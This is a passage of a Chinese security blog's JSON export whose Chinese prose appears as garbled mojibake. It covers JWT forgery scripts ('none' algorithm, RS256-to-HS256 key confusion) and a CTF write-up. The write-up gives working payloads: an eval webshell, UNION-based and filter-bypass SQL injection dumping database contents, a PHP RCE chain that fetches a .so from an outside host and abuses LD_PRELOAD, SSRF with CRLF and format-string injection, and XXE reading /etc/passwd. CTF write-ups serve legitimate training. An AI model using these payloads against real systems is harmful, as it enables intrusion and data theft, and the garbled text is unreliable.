å…¥åˆ° token ä¸­æ˜¯ä¸ºäº†é¿å…é‡å¤æŸ¥åº“ Headerï¼ˆå¤´éƒ¨ï¼‰ Header æ˜¯ä¸€ä¸ª JSON å¯¹è±¡ &#123; &quot;alg&quot;: &quot;HS256&quot;, // è¡¨ç¤ºç­¾åçš„ç®—æ³•ï¼Œé»˜è®¤æ˜¯ HMAC SHA256ï¼ˆå†™æˆ HS256ï¼‰ &quot;typ&quot;: &quot;JWT&quot; // è¡¨ç¤ºTokençš„ç±»å‹ï¼ŒJWT ä»¤ç‰Œç»Ÿä¸€å†™ä¸ºJWT &#125; Payloadï¼ˆè´Ÿè½½ï¼‰ Payload éƒ¨åˆ†ä¹Ÿæ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œç”¨æ¥å­˜æ”¾å®é™…éœ€è¦ä¼ é€’çš„æ•°æ® &#123; // 7ä¸ªå®˜æ–¹å­—æ®µ &quot;iss&quot;: &quot;a.com&quot;, // issuerï¼šç­¾å‘äºº &quot;exp&quot;: &quot;1d&quot;, // expiration timeï¼š è¿‡æœŸæ—¶é—´ &quot;sub&quot;: &quot;test&quot;, // subject: ä¸»é¢˜ &quot;aud&quot;: &quot;xxx&quot;, // audienceï¼š å—ä¼— &quot;nbf&quot;: &quot;xxx&quot;, // Not Beforeï¼šç”Ÿæ•ˆæ—¶é—´ &quot;iat&quot;: &quot;xxx&quot;, // Issued Atï¼š ç­¾å‘æ—¶é—´ &quot;jti&quot;: &quot;1111&quot;, // JWT IDï¼šç¼–å· // å¯ä»¥å®šä¹‰ç§æœ‰å­—æ®µ &quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true &#125; JWT é»˜è®¤æ˜¯ä¸åŠ å¯†çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥è¯»åˆ°ï¼Œæ‰€ä»¥ä¸è¦æŠŠç§˜å¯†ä¿¡æ¯æ”¾åœ¨è¿™ä¸ªéƒ¨åˆ†ã€‚ Signatureï¼ˆç­¾åï¼‰ Signature æ˜¯å¯¹å‰ä¸¤éƒ¨åˆ†çš„ç­¾åï¼Œé˜²æ­¢æ•°æ®è¢«ç¯¡æ”¹ã€‚ é¦–å…ˆï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªå¯†é’¥(secret)ã€‚è¿™ä¸ªå¯†é’¥åªæœ‰æœåŠ¡å™¨æ‰çŸ¥é“ï¼Œä¸èƒ½æ³„éœ²ç»™ç”¨æˆ·ã€‚ç„¶åï¼Œä½¿ç”¨Headeré‡Œé¢æŒ‡å®šçš„ç­¾åç®—æ³•ï¼ˆé»˜è®¤æ˜¯ HMAC SHA256ï¼‰ï¼ŒæŒ‰ç…§ä¸‹é¢çš„å…¬å¼äº§ç”Ÿç­¾åã€‚ HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) ç®—å‡ºç­¾ååï¼ŒæŠŠ Headerã€Payloadã€Signature ä¸‰ä¸ªéƒ¨åˆ†æ‹¼æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯ä¸ªéƒ¨åˆ†ä¹‹é—´ç”¨â€ç‚¹â€ï¼ˆ.ï¼‰åˆ†éš”ï¼Œå°±å¯ä»¥è¿”å›ç»™ç”¨æˆ·ã€‚ JWT = Base64(Header) + &quot;.&quot; + Base64(Payload) + &quot;.&quot; + $Signature å¦‚ä½•ä¿è¯å®‰å…¨ï¼Ÿ å‘é€JWTè¦ä½¿ç”¨HTTPSï¼›ä¸ä½¿ç”¨HTTPSå‘é€çš„æ—¶å€™ï¼ŒJWTé‡Œä¸è¦å†™å…¥ç§˜å¯†æ•°æ® JWTçš„payloadä¸­è¦è®¾ç½®expireæ—¶é—´ JWTæ”»å‡»æ‰‹æ®µéå¯¹ç§°-&gt;å¯¹ç§°æ”»å‡»HS256ç®—æ³•ä½¿ç”¨å¯†é’¥ä¸ºæ‰€æœ‰æ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯ã€‚ è€ŒRS256ç®—æ³•åˆ™ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åå¹¶ä½¿ç”¨å…¬é’¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚ å¦‚æœå°†ç®—æ³•ä»RS256æ”¹ä¸ºHS256ï¼Œåˆ™åç«¯ä»£ç å°†ä½¿ç”¨å…¬é’¥ä½œä¸ºå¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256ç®—æ³•éªŒè¯ç­¾åã€‚ ç”±äºæ”»å‡»è€…æœ‰æ—¶å¯ä»¥è·å–å…¬é’¥ï¼Œå› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å°†å¤´éƒ¨ä¸­çš„ç®—æ³•ä¿®æ”¹ä¸ºHS256ï¼Œç„¶åä½¿ç”¨RSAå…¬é’¥å¯¹æ•°æ®è¿›è¡Œç­¾åã€‚ è¿™æ ·çš„è¯ï¼Œåç«¯ä»£ç ä½¿ç”¨RSAå…¬é’¥+HS256ç®—æ³•è¿›è¡Œç­¾åéªŒè¯ åŒæ ·çš„ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥ç†è§£è¿™ç§æ”»å‡»æ–¹å¼ http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php RSAå…¬é’¥ï¼šhttp://demo.sjoerdlangkemper.nl/jwtdemo/public.pem è¯¥ä¾‹å­è§£æ³•å¦‚ä¸‹ï¼š 12345678910111213import jwt# eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9# &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125;# eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNzg3NCwiZXhwIjoxNTA0MDA3OTk0LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &#123;&quot;iss&quot;:&quot;http:\\&#x2F;\\&#x2F;demo.sjoerdlangkemper.nl\\&#x2F;&quot;,&quot;iat&quot;:1504007874,&quot;exp&quot;:1504007994,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;public &#x3D; open(&#39;public.pem.1&#39;, &#39;r&#39;).read()print publicprint jwt.encode(&#123;&quot;data&quot;:&quot;test&quot;&#125;, key&#x3D;public, algorithm&#x3D;&#39;HS256&#39;) &#x2F;&#x2F;ä¿®æ”¹payloadä¸­çš„æ˜æ–‡ä¿¡æ¯ å¯†é’¥çˆ†ç ´æ”»å‡»å› ä¸ºHS256åªæœ‰ä¸€ä¸ªå¯†é’¥ï¼Œè§£å¯†åŠ å¯†éƒ½æ˜¯åŒä¸€ä¸ªå¯†é’¥ï¼Œå› æ­¤ç ´è§£æ¯”è¾ƒå®¹æ˜“ã€‚ é™„ä¸Šç°æˆçš„ç ´è§£å·¥å…·é“¾æ¥https://github.com/brendan-rius/c-jwt-cracker ä¿®æ”¹ç®—æ³•noneç­¾åç®—æ³•ä¿è¯äº†JWTåœ¨ä¼ è¾“çš„è¿‡ç¨‹ä¸­ä¸è¢«æ¶æ„ç”¨æˆ·ä¿®æ”¹ ä½†æ˜¯headerä¸­çš„algå­—æ®µå¯è¢«ä¿®æ”¹ä¸ºnone ä¸€äº›JWTåº“æ”¯æŒnoneç®—æ³•ï¼Œå³æ²¡æœ‰ç­¾åç®—æ³•ï¼Œå½“algä¸ºnoneæ—¶åç«¯ä¸ä¼šè¿›è¡Œç­¾åæ ¡éªŒ å°†algä¿®æ”¹ä¸ºnoneåï¼Œå»æ‰JWTä¸­çš„signatureæ•°æ®ï¼ˆä»…å‰©header + â€˜.â€™ + payload + â€˜.â€™ï¼‰ç„¶åæäº¤åˆ°æœåŠ¡ç«¯å³å¯ è¿™ç§æ”»å‡»çš„ä¾‹å­å¯ä»¥å‚è€ƒï¼šhttp://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php ä»£ç å¯ä»¥åœ¨Githubä¸Šæ‰¾åˆ° https://github.com/Sjord/jwtdemo/ è¿™ä¸ªä¾‹å­çš„è§£æ³•å¦‚ä¸‹ 12345678910111213141516import jwtimport base64# åŸheader# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9# &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;# åŸpayload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &#123;&quot;iss&quot;:&quot;http:\\&#x2F;\\&#x2F;demo.sjoerdlangkemper.nl\\&#x2F;&quot;,&quot;iat&quot;:1504006435,&quot;exp&quot;:1504006555,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;def b64urlencode(data): return base64.b64encode(data).replace(&#39;+&#39;, &#39;-&#39;).replace(&#39;&#x2F;&#39;, &#39;_&#39;).replace(&#39;&#x3D;&#39;, &#39;&#39;)# æ„é€ ç®—æ³•å­—æ®µä¸ºnone, payloadéƒ¨åˆ†å¯ä»¥éšæ„ä¿®æ”¹print b64urlencode(&quot;&#123;\\&quot;typ\\&quot;:\\&quot;JWT\\&quot;,\\&quot;alg\\&quot;:\\&quot;none\\&quot;&#125;&quot;) + \\ &#39;.&#39; + b64urlencode(&quot;&#123;\\&quot;data\\&quot;:\\&quot;test\\&quot;&#125;&quot;) + &#39;.&#39;","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"JWT","slug":"JWT","permalink":"http://www.m00nback.xyz/tags/JWT/"}]},{"title":"SYCæå®¢å¤§æŒ‘æˆ˜writeup","slug":"syc-ctf-wp","date":"2019-11-06T07:17:41.000Z","updated":"2020-05-16T09:02:51.672Z","comments":true,"path":"2019/11/06/syc-ctf-wp/","link":"","permalink":"http://www.m00nback.xyz/2019/11/06/syc-ctf-wp/","excerpt":"å¬å­¦é•¿è¯´è¿™é‡Œçš„é¢˜è¿˜æŒºç®€å•çš„ï¼Œä¾¿è¿‡æ¥åšäº†åšï¼Œæ€»ç»“ä¸€ä¸‹å§ï¼","text":"å¬å­¦é•¿è¯´è¿™é‡Œçš„é¢˜è¿˜æŒºç®€å•çš„ï¼Œä¾¿è¿‡æ¥åšäº†åšï¼Œæ€»ç»“ä¸€ä¸‹å§ï¼ æ‰“æ¯”èµ›ä¹‹å‰å…ˆæ’¸ä¸€åªçŒ«ï¼æŸ¥çœ‹æºä»£ç ï¼Œå‘ç° 12345$cat&#x3D;$_GET[&#39;cat&#39;];echo $cat;if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123; echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;&#125; getä¼ å‚å°±è¡Œ ?cat=dog Syc&#123;I_actu4l1y_Lik3_d0gs&#125; ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆæ‰“å¼€ç½‘é¡µå‘ç° eval($_POST[&quot;Syc&quot;]); èšå‰‘ç›´æ¥è¿å°±è¡Œï¼Œå‘ç°æ ¹ç›®å½•é‡Œæœ‰flagæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€å‘ç°flag.txtæ–‡ä»¶ï¼ŒæŸ¥çœ‹å¾—åˆ°flag Syc&#123;Upl0ad_f1l3_i5_daNger0us&#125; BurpSuiiiiiit!!!ä¸‹è½½è¿‡æ¥æ˜¯ä¸ª.jaræ–‡ä»¶ï¼Œbpå¯¼å…¥å³å¯ åœ¨Errorså¯ä»¥çœ‹åˆ°flag Syc&#123;BurpExtender_Are_guns_F0r_Hack3rs&#125; æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦æŸ¥çœ‹æºä»£ç å‘ç° 123456789101112131415$savepath &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;&#x2F;&quot;;if (!is_dir($savepath)) &#123; $oldmask &#x3D; umask(0); mkdir($savepath); umask($oldmask);&#125;if ((@$_GET[&#39;u&#39;]) &amp;&amp; (@$_GET[&#39;p&#39;])) &#123; $content &#x3D; &#39;***************&#39;; file_put_contents(&quot;$savepath&quot; . sha1($_GET[&#39;u&#39;]), $content); $msg &#x3D; &#39;Ding!ä½ çš„ç®—å¦ç»“æœå°±åœ¨è¿™å„¿å•¦ï¼ &#39; . $savepath . htmlspecialchars(sha1($_GET[&#39;u&#39;])) . &quot;&quot;; echo $msg; usleep(100000); @$content &#x3D; &quot;you are too slow&quot;; file_put_contents(&quot;$savepath&quot; . sha1($_GET[&#39;u&#39;]), $content);&#125; æç¤ºç”¨æ¡ä»¶ç«äº‰ è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯æ ¹æ®ä½ çš„ipï¼Œå¯¹å…¶sha1åŠ å¯†ï¼Œå¹¶åˆ›å»ºè¿™ä¸ªæ–‡ä»¶å¤¹ã€‚ ç„¶åGETæ–¹å¼æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œå°†ä¼ è¿‡æ¥çš„uè¿›è¡Œsha1åŠ å¯†ï¼Œå¹¶åˆ›å»ºè¯¥æ–‡ä»¶ï¼Œé‡Œé¢å†™å¦‚$contentï¼ˆç›®æµ‹flag)ï¼Œç„¶åç¨‹åºç¡çœ 100000å¾®ç§’ï¼Œä¸€å¾®ç§’ç­‰äºç™¾ä¸‡åˆ†ä¹‹ä¸€ç§’ï¼Œå¤§æ¦‚æ˜¯0.1sï¼Œçœ‹åˆ°è¿™å°±ç”¨ç«äº‰äº† ç”±äºä½ çš„ipåœ°å€ä¸å˜ï¼Œå¦‚æœè¯·æ±‚çš„uä¸å˜çš„è¯ï¼Œé‚£ä¹ˆæ–‡ä»¶urlæ˜¯å›ºå®šçš„ bpå¼€ä¸¤ä¸ªintruderï¼Œä¸€ä¸ªæ˜¯è®©å®ƒç”Ÿæˆæ–‡ä»¶ï¼Œä¸€ä¸ªè®¿é—®æ–‡ä»¶ Syc&#123;You-4re-S0-f4st&#125; Easysqlè¿™é¢˜æ˜¯å¤šæ¬¡è¯•å‡ºæ¥çš„ å…ˆåœ¨ç”¨æˆ·ååŠ ä¸ª&#39; å‘ç°æŠ¥é”™ä¿¡æ¯ åˆ†æä¸€ä¸‹æŠ¥é”™ä¿¡æ¯ï¼ŒçŒœæµ‹åå°sqlè¯­å¥ä¸º&#39;$username&#39; payload: ç”¨æˆ·åå¤„ï¼š admin&#39; or 1# Syc&#123;sqL_inj3cti0n_1s_re4lly_fUn&#125; RCE meè¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯æ— å­—æ¯æ•°å­—ç»•è¿‡ + disable_fuctionç»•è¿‡ 123456789101112131415161718&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123; $code&#x3D;$_GET[&#39;code&#39;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;highlight_file(__FILE);&#x2F;&#x2F; ?&gt; è¿™é“é¢˜å¯èƒ½çœ‹ç€å¾ˆç†Ÿæ‚‰ï¼Œå¯ä»¥çœ‹ä¸‹æˆ‘è¿™ç¯‡åšå®¢http://www.moonback.xyz/2019/10/16/nowords-webshell/ ä½†è¿™é“é¢˜å¹¶ä¸æ˜¯é‚£ç§æ€è·¯ å…ˆçœ‹ä¸‹phpinfoå§ http://114.116.44.23:40001/?code=$_=%22%23./|&#123;%22^%22|~`//%22;$&#123;$_&#125;[_](); POST _=phpinfo æˆ–è€…ç›´æ¥ç”¨å¼‚æˆ–æˆ–è€…å–åæ„é€ ä¹Ÿè¡Œï¼Œå¹¶ä¸”å‘ç°å¥½åƒåªèƒ½ä¼ POSTä¸¤ä¸ªå‚æ•° çœ‹ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°æœ‰flagæ–‡ä»¶å’Œreadflagï¼ŒçŒœæµ‹flagæ˜¯ç›´æ¥è¯»ä¸äº†çš„ï¼Œå¿…é¡»è¿è¡Œreadflagæ‰èƒ½ å‘ç°èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°åŸºæœ¬éƒ½è¿‡æ»¤äº† è¿™é‡Œå°±ç”¨LD_PRELOADæ¥ç»•è¿‡äº† ?code=$_=$&#123;~%A0%AF%B0%AC%AB&#125;[_];$_($&#123;~%A0%AF%B0%AC%AB&#125;[__]); åˆ©ç”¨è¿™ä¸ªpayloadï¼Œ_ä¼ assert(ä¸çŸ¥é“ä¸ºå•¥evalä¸è¡Œ),__ä¼ æ¶æ„ä»£ç  ç¬¬ä¸€æ­¥ï¼Œå…ˆå¾€æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ª.soå…±äº«åº“æ–‡ä»¶ï¼Œå¯ä»¥æ”¾åœ¨/tmpç›®å½•ä¸‹å› ï¼Œä¸ºè¿™ä¸ªè·¯å¾„é»˜è®¤æƒé™æ˜¯777ï¼Œå¯ä»¥ä½¿ç”¨ file_put_contents(&quot;/tmp/bypass_disablefunc_x64.so&quot;,file_get_contents(&quot;http://****/bypass_disablefunc_x64.so&quot;)) æˆ–è€…ç”¨copyå‡½æ•° copy(&quot;http://******/bypass_disablefunc_x64.so&quot;,&quot;/tmp/bypass_disablefunc_x64.so&quot;) ç¬¬äºŒæ­¥ï¼Œå‘/tmpç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªphpæ–‡ä»¶ file_put_contents(&quot;/tmp/moonback&quot;,&quot;&lt;?php putenv(&#39;EVIL_CMDLINE=&#39;.&#39;cd /%26%26./readflag &gt; /tmp/moonback1 2&gt;%261&#39;);putenv(&#39;LD_PRELOAD=&#39;.&#39;/tmp/bypass_disablefunc_x64.so&#39;);mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);?&gt;&quot;); å…¶å†…å®¹å†™å…¥ 12345&lt;?php putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;); &#x2F;&#x2F;EVIL_CMDLINE&#x3D;shellå‘½ä»¤ï¼Œå¹¶å°†ç»“æœè¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;); &#x2F;&#x2F;LD_PRELOAD&#x3D;åŠ¨æ€åŠ è½½åº“çš„ä½ç½®mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;); &#x2F;&#x2F;ç”¨mailå‡½æ•°è§¦å‘?&gt; è¿™ä¸ªå†…å®¹çš„&amp;ç¬¦å·è¦urlç¼–ç %26 ç¬¬ä¸‰æ­¥ï¼ŒåŒ…å«æ–‡ä»¶ï¼ŒæŸ¥çœ‹è¾“å‡ºç»“æœ include(&#39;/tmp/moonback&#39;) var_dump(file_get_contents(&#39;/tmp/moonback1&#39;)) æˆåŠŸè§£é¢˜ æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µè¿™é¢˜å¹¶æ²¡æœ‰ç¥é­”æ¼æ´ï¼Œåªéœ€åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šæ¯æ¬¡è®¿é—®è®©å®ƒè¿”å›ä¸ä¸€æ ·çš„ä¸œè¥¿å°±è¡Œ å¯ä»¥ç”¨flaskç®€å•æ­ä¸€ä¸ª 12345678910import flask import datetimeserver&#x3D;flask.Flask(__name__) data&#x3D;&quot;If I knew where I would die, I would never go there.&quot; data&#x3D;data.split(&quot; &quot;) data.reverse()server.route(&#39;&#x2F;&#39;,methods&#x3D;[&#39;post&#39;,&#39;get&#39;]) def index(): return data.pop()server.run(port&#x3D;9999) æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿè®¿é—®é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°admin.phpï¼Œè®¿é—®æ˜¾ç¤º127.0.0.1æ‰èƒ½è®¿é—®ï¼Œè¯´æ˜admin.phpéœ€è¦index.php ssrf åœ¨æºç å‘ç°è¿™ä¸ª 12345678910111213141516171819202122232425262728293031323334&lt;!-- if(isset($_POST[&#39;method&#39;]) &amp;&amp; isset($_POST[&#39;url&#39;]) )&#123; $method&#x3D;$_POST[&#39;method&#39;]; $url&#x3D;$_POST[&#39;url&#39;]; if(preg_match(&#39;&#x2F;^http:\\&#x2F;\\&#x2F;&#x2F;i&#39;,$url))&#123; $opts &#x3D; array( &#39;http&#39;&#x3D;&gt;array( &#39;method&#39;&#x3D;&gt;$method, &#39;timeout&#39;&#x3D;&gt;3 ) ); $context &#x3D; stream_context_create($opts); $body &#x3D; @file_get_contents($url.&quot;&#x2F;anything&quot;, false, $context); if(isset($http_response_header))&#123; preg_match(&quot;&#x2F;Allow:(.*?);&#x2F;i&quot;,implode(&#39;;&#39;,$http_response_header).&quot;;&quot;,$matches); if(isset($matches[1]))&#123; echo &quot;æœåŠ¡ç«¯æ”¯æŒçš„è¯·æ±‚æ–¹æ³•æœ‰:&quot;.$matches[1]; &#125;else&#123; echo &quot;failed&lt;br&gt;&quot;; echo sprintf(&quot;body length of $method%d&quot;, $body); &#125; &#125;else&#123; echo &quot;error&quot;; &#125; &#125;else&#123; echo &#39;not allowed&#39;; &#125; &#125;--&gt; methodå’Œurlå¯æ§ï¼Œurlå¿…é¡»æ˜¯http://å¼€å¤´ è¾“å…¥çš„urlä¼šæ‹¼æ¥ä¸Š/anythingç„¶åä»¥optionsè¯·æ±‚æ–¹æ³•è®¿é—®ï¼Œä¸€æ¬¡å¾—åˆ°Allowè¿”å›å¤´ ä¸è¿‡sprintf(&quot;body length of $method%d&quot;, $body);è¿™å¥ä»£ç æœ‰é”™è¯¯ å› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²&quot;body length of $method%d&quot;å¯æ§ï¼Œæ‰€ä»¥åªè¦æŠŠ%dç»™è½¬ä¹‰æ‰ï¼Œå†æ³¨å…¥%sï¼Œå°±èƒ½è®©å…¶æ˜¾ç¤º$bodyå†…å®¹ï¼Œ ä¾‹å¦‚$methodä¼ å…¥%s%ï¼Œé‚£ä¹ˆæœ€åæ‹¼æ¥æˆçš„ä¾¿æ˜¯body length of %s%%dï¼Œè€Œæœ€åæ˜¾ç¤ºçš„æ•ˆæœå°±æ˜¯body length of è¿”å›çš„æ•°æ®%d å†é€šè¿‡ssrf POSTä¸€ä¸ªiwantflag=yesï¼Œä½†æ˜¯æ€æœ«POSTå‘¢ï¼Ÿ å‘ç°è¿™é‡Œç”¨çš„æ˜¯file_get_context_create()å‡½æ•°æ¥å‘èµ·HTTPè¯·æ±‚ï¼Œä¸€äº›é…ç½®é€‰é¡¹åŒ…æ‹¬è¿™é‡Œçš„è¯·æ±‚æ–¹å¼æ˜¯ä½œä¸ºä¸€ä¸ªæ•°ç»„ç»è¿‡stream_context_create()å¤„ç†åä¼ å…¥çš„ã€‚å…¶å®è¿™é‡Œå°±å­˜åœ¨CRLFæ³¨å…¥æ¼æ´ï¼Œå³æˆ‘ä»¬å¯ä»¥å®Œå…¨è‡ªå·±æ„é€ ä¸€ä¸ªå®Œæ•´çš„POSTåŒ…å‘å‡ºå» å…·ä½“å¦‚ä¸‹ï¼š iwantflag=yes%26b=%s%ä¸­çš„%26æ˜¯&amp;çš„urlç¼–ç ï¼Œè¿™é‡Œæ˜¯å¿…é¡»è¦ç¼–ç çš„ï¼Œå¦åˆ™å°±è¢«å½“åšå½“å‰é¢è¯·æ±‚åŒ…çš„å‚æ•°åˆ†å‰²ç¬¦äº† è¿˜æœ‰ä¸ºä»€ä¹ˆè¿™é‡Œå¤šä¼ äº†ä¸€ä¸ªbå‚æ•°ï¼Œå› ä¸ºè§‚å¯Ÿæœ€ç»ˆçš„è¯·æ±‚åŒ…å°±çŸ¥é“åé¢æ˜¯ä¼šè¢«æ‹¼æ¥ä¸ŠåŸæœ¬æ­£ å¸¸çš„HTTPè¯·æ±‚åŒ…ä¸­çš„å†…å®¹çš„ï¼Œæ‰€ä»¥ä¸ºäº†é˜²æ­¢å¹²æ‰°iwantflagå˜é‡å°±åˆåŠ ä¸€ä¸ªå˜é‡ ç”±äºæˆ‘ä»¬æ˜¯è¦å¾—åˆ°è¿”å›çš„æ•°æ®çš„ï¼Œæ‰€ä»¥æœ€åä¾ç„¶æ˜¯%s% è¯·æ±‚å¤´ä¸­çš„Content-Lengthä¹Ÿå¾ˆé‡è¦ï¼Œå’Œè¯·æ±‚åŒ…æ•°æ®å®é™…é•¿åº¦ä¸ç¬¦æ˜¯ä¸ä¼šå¾—åˆ°æ­£ç¡®å›åº”çš„ï¼Œ æ‰€ä»¥å®é™…ä¸­è¦è‡ªå·±ä¼°é‡ Lovelysqlè¿™é¢˜å…¶å®æ˜¯è€ƒå¯Ÿè”åˆæŸ¥è¯¢ï¼Œå°†è¯·æ±‚ä¿¡æ¯ä¿å­˜æˆæ–‡ä»¶ï¼Œç”¨sqlmapè·‘ä¸‹å°±å‡ºæ¥äº† Syc&#123;Ohhh_y0u_foUnd_m3&#125; ä¸urlç¼–ç ä¼šæŠ¥é”™ order byåˆ¤æ–­ä¸º3åˆ— 1check.php?username=a%27%20order%20by%204%23&amp;password=adsdas åˆ¤æ–­å›æ˜¾åˆ—ä¸º2ï¼Œ3åˆ— 1check.php?username=a%27%20union%20select%201,2,3%23&amp;password=adsdas æŠ¥æ•°æ®åº“ 12check.php?username=a%27%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%23&amp;password=adsdas# information_schema,test,performance_schema,mysql,geek çˆ†è¡¨ 12check.php?username=a%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=&quot;geek&quot;%23&amp;password=adsdas# geekuser,l0ve1ysq1 çˆ†å­—æ®µ 12check.php?username=a%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=&quot;geek&quot;%20and%20table_name=&quot;l0ve1ysq1&quot;%23&amp;password=adsdas# id,username,password çˆ†å†…å®¹ 12check.php?username=a%27%20union%20select%201,group_concat(id,0x23,username,0x23,password),3%20from%20geek.l0ve1ysq1%23&amp;password=adsdas# æˆåŠŸçˆ†å‡ºflag æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©å‘é€flagï¼ŒæŠ“åŒ…çœ‹åˆ° å°†guestæ”¹æˆadminå‘ç° ç»™äº†ä¸ªæç¤ºï¼Œname=md5($flag)ï¼Œè¿™é‡Œå°±ç”¨åˆ°å¼±ç±»å‹äº†ï¼Œå³æ•°å­—å’Œå­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œå­—ç¬¦ä¸²ä¼šå…ˆè½¬æ¢æˆæ•°å­—ï¼ŒçŒœæµ‹$flagåŠ å¯†åå‰å‡ ä½æ˜¯æ•°å­—ï¼Œbpçˆ†ç ´ï¼Œçˆ†ç ´çš„å†…å®¹ä¸ºname å‘ç°ä¸ºpaload=357æ—¶ï¼Œæœ‰ä¸ªæç¤º è®¿é—®å‘ç°ç¥é­”éƒ½æ²¡æœ‰ï¼Œå¹¶ä¸”æç¤ºé‡Œè®©æˆ‘ä»¬è¯»è¿™ä¸ªæ–‡ä»¶ï¼Œå†µä¸”é¢˜ç›®è€ƒå¯Ÿçš„ç‚¹æœ‰xxe å†è¿”å›é‚£ä¸ªPOSTè¯·æ±‚ï¼Œä¹‹å‰æäº¤çš„æ˜¯jsonæ ¼å¼çš„ï¼Œé‚£æ˜¯å¦èƒ½æäº¤xmlæ ¼å¼çš„é‚£ï¼Ÿ å‘ç°èƒ½å›æ˜¾çš„åœ°æ–¹æ˜¯nameï¼Œè¯»å–/etc/passwdæˆåŠŸï¼Œé‚£ä¹ˆå°±è¯»ä¸€ä¸‹flag ä½†æ˜¯ä¼šå‘ç°ç›´æ¥è¯»f14g_Is_Here.phpè¯»ä¸å‡ºæ¥ï¼Œè¿™æ˜¯å› ä¸ºphpæ–‡ä»¶ä¸­æœ‰ç‰¹æ®Šå­—ç¬¦(å¦‚&lt;)è®©xmlè§£ ææ—¶å‡ºé”™äº†,å¯ä»¥åˆ©ç”¨phpæµè¯»å–ï¼Œbase64è§£å¯†å°±è¡Œ æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µBabysqlè¿™é¢˜åŒå†™ç»•è¿‡å°±è¡Œï¼Œå‘ç°å¯¹union,select,for,forméƒ½æ›¿æ¢æˆç©ºäº† çˆ†æ•°æ®åº“ ?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23 çˆ†è¡¨ ?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23 çˆ†å­—æ®µ ?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=&#39;geek&#39; anandd table_name=&#39;b4bsql&#39;%23 çˆ†å†…å®¹ ?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(id,0x23,username,0x23,passwoorrd) frfromom geek.b4bsql%23 